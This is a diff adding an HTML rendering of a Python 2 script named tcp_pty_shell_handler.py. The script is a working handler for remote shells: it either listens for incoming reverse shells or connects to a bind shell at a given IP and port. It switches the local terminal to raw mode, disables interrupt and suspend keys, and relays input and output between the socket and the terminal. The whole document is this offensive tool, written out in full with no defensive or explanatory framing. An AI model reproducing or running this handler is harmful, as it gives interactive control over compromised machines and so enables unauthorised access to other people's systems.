@@ -1,0 +1,167 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>tcp_pty_shell_handler.py</title>
+</head><body>#!/usr/bin/env python2<br/>
+import termios<br/>
+import select<br/>
+import socket<br/>
+import os<br/>
+import fcntl<br/>
+import argparse<br/>
+<br/>
+class PTY:<br/>
+  def __init__(self, slave=0, pid=os.getpid()):<br/>
+    # apparently python GC's modules before class instances so, here<br/>
+    # we have some hax to ensure we can restore the terminal state.<br/>
+    self.termios, self.fcntl = termios, fcntl<br/>
+<br/>
+    # open our controlling PTY<br/>
+    self.pty = open(os.readlink(&quot;/proc/%d/fd/%d&quot; % (pid, slave)), &quot;rb+&quot;)<br/>
+<br/>
+    # store our old termios settings so we can restore after<br/>
+    # we are finished <br/>
+    self.oldtermios = termios.tcgetattr(self.pty)<br/>
+<br/>
+    # get the current settings se we can modify them<br/>
+    newattr = termios.tcgetattr(self.pty)<br/>
+<br/>
+    # set the terminal to uncanonical mode and turn off<br/>
+    # input echo.<br/>
+    newattr[3] &amp;= ~termios.ICANON &amp; ~termios.ECHO<br/>
+<br/>
+    # don't handle ^C / ^Z / ^\<br/>
+    newattr[6][termios.VINTR] = '\x00'<br/>
+    newattr[6][termios.VQUIT] = '\x00'<br/>
+    newattr[6][termios.VSUSP] = '\x00'<br/>
+<br/>
+    # set our new attributes<br/>
+    termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)<br/>
+<br/>
+    # store the old fcntl flags<br/>
+    self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)<br/>
+    # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)<br/>
+    # make the PTY non-blocking<br/>
+    fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)<br/>
+<br/>
+  def read(self, size=8192):<br/>
+    return self.pty.read(size)<br/>
+<br/>
+  def write(self, data):<br/>
+    ret = self.pty.write(data)<br/>
+    self.pty.flush()<br/>
+    return ret<br/>
+<br/>
+  def fileno(self):<br/>
+    return self.pty.fileno()<br/>
+<br/>
+  def __del__(self):<br/>
+    # restore the terminal settings on deletion<br/>
+    self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)<br/>
+    self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)<br/>
+<br/>
+class Shell:<br/>
+  def __init__(self, addr, bind=True):<br/>
+    self.bind = bind<br/>
+    self.addr = addr<br/>
+<br/>
+    if self.bind:<br/>
+      self.sock = socket.socket()<br/>
+      self.sock.bind(self.addr)<br/>
+      self.sock.listen(5)<br/>
+<br/>
+  def handle(self, addr=None):<br/>
+    addr = addr or self.addr<br/>
+    if self.bind:<br/>
+      sock, addr = self.sock.accept()<br/>
+    else:<br/>
+      sock = socket.socket()<br/>
+      sock.connect(addr)<br/>
+<br/>
+    # create our PTY<br/>
+    pty = PTY()<br/>
+<br/>
+    # input buffers for the fd's<br/>
+    buffers = [ [ sock, [] ], [ pty, [] ] ]<br/>
+    def buffer_index(fd):<br/>
+      for index, buffer in enumerate(buffers):<br/>
+        if buffer[0] == fd:<br/>
+          return index<br/>
+<br/>
+    readable_fds = [ sock, pty ]<br/>
+<br/>
+    data = &quot; &quot;<br/>
+    # keep going until something deds<br/>
+    while data:<br/>
+      # if any of the fd's need to be written to, add them to the<br/>
+      # writable_fds<br/>
+      writable_fds = []<br/>
+      for buffer in buffers:<br/>
+        if buffer[1]:<br/>
+          writable_fds.append(buffer[0])<br/>
+<br/>
+      r, w, x = select.select(readable_fds, writable_fds, [])<br/>
+<br/>
+      # read from the fd's and store their input in the other fd's buffer<br/>
+      for fd in r:<br/>
+        buffer = buffers[buffer_index(fd) ^ 1][1]<br/>
+        if hasattr(fd, &quot;read&quot;):<br/>
+          data = fd.read(8192)<br/>
+        else:<br/>
+          data = fd.recv(8192)<br/>
+        if data:<br/>
+          buffer.append(data)<br/>
+<br/>
+      # send data from each buffer onto the proper FD<br/>
+      for fd in w:<br/>
+        buffer = buffers[buffer_index(fd)][1]<br/>
+        data = buffer[0]<br/>
+        if hasattr(fd, &quot;write&quot;):<br/>
+          fd.write(data)<br/>
+        else:<br/>
+          fd.send(data)<br/>
+        buffer.remove(data)<br/>
+<br/>
+    # close the socket<br/>
+    sock.close()<br/>
+<br/>
+if __name__ == &quot;__main__&quot;:<br/>
+  # I could do this validation with regex.. but meh.<br/>
+  def AddressString(value):<br/>
+    address = value.split(&quot;:&quot;)<br/>
+<br/>
+    if len(address) != 2:<br/>
+      raise argparse.ArgumentTypeError(&quot;Address must be in format IP:Port.&quot;)<br/>
+<br/>
+    if len(address[0].split(&quot;.&quot;)) != 4:<br/>
+     raise argparse.ArgumentTypeError(&quot;Invalid IP length.&quot;)<br/>
+<br/>
+    for octet in address[0].split(&quot;.&quot;):<br/>
+      try:<br/>
+        if int(octet) &gt; 255 or int(octet) &lt; 0:<br/>
+          raise argparse.ArgumentTypeError(&quot;Invalid octet in address.&quot;)<br/>
+      except ValueError:<br/>
+        raise argparse.ArgumentTypeError(&quot;Invalid octet in address.&quot;)<br/>
+<br/>
+    try:<br/>
+      address[1] = int(address[1])<br/>
+      if address[1] &lt; 0 or address[1] &gt; 65535:<br/>
+        raise argparse.ArgumentTypeError(&quot;Invalid port number&quot;)<br/>
+    except ValueError:<br/>
+      raise argparse.ArgumentTypeError(&quot;Invalid port number.&quot;)<br/>
+<br/>
+    return tuple(address)<br/>
+<br/>
+  parser = argparse.ArgumentParser()<br/>
+<br/>
+  group = parser.add_mutually_exclusive_group(required=True)<br/>
+  group.add_argument(&quot;-b&quot;, &quot;--bind&quot;, help=&quot;Reverse shell handler.&quot;,<br/>
+           action=&quot;store_true&quot;)<br/>
+  group.add_argument(&quot;-c&quot;, &quot;--connect&quot;, help=&quot;Bind shell handler.&quot;, <br/>
+           action=&quot;store_true&quot;)<br/>
+  parser.add_argument(&quot;address&quot;, type=AddressString, <br/>
+            help=&quot;IP address/port to bind/connect to.&quot;)<br/>
+  args = parser.parse_args()<br/>
+<br/>
+  s = Shell(args.address, bind=args.bind)<br/>
+  s.handle()</body></html>
